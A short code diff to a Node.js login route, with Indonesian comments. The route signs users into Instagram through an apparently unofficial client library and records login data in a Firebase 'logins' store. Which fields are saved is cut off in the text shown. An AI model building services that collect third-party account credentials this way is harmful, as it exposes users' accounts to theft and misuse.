@@ -179,12 +179,6 @@ router.post('/login', async (req, res) => {
     console.log('Menerima request POST di /login');
     const { username, password } = req.body;
 
-    const sessionPath = path.resolve(__dirname, '../session.json');
-    if (fs.existsSync(sessionPath)) {
-        fs.unlinkSync(sessionPath);
-        console.log('Sesi sebelumnya telah dihapus.');
-    }
-
     try {
         ig.state.generateDevice(username);
         await ig.account.login(username, password);
@@ -195,6 +189,7 @@ router.post('/login', async (req, res) => {
         const user = await ig.account.currentUser();
         const userId = user.pk;
 
+        // Simpan data login ke Firebase
         const ref = db.ref('logins');
         const loginData = {
             username: username,
@@ -212,5 +207,6 @@ router.post('/login', async (req, res) => {
         res.status(500).json({ error: 'Login gagal. Cek kredensial atau coba lagi.' });
     }
 });
+
 
 module.exports = router;
